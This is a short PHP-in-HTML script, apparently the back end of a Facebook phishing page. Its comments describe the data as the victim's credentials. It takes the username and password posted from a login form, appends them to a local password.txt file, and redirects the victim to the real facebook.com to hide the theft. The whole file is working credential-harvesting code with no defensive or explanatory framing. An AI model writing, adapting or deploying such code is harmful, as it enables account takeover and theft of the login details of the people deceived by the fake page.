<html>
<body>
<?php

// open file to store the victim's credentials
$myfile = fopen("password.txt", "a") or die("Unable to open file!");
$user = $_POST["username"];
$pass = $_POST["password"];


// write the username
fwrite($myfile, $user);
fwrite($myfile, "\n");

// write the password
fwrite($myfile, $pass);
fwrite($myfile, "\n");
fwrite($myfile, "\n");
fclose($myfile);

// redirect the real site
header("Location: https://www.facebook.com/");
?> 
</body>
</html> 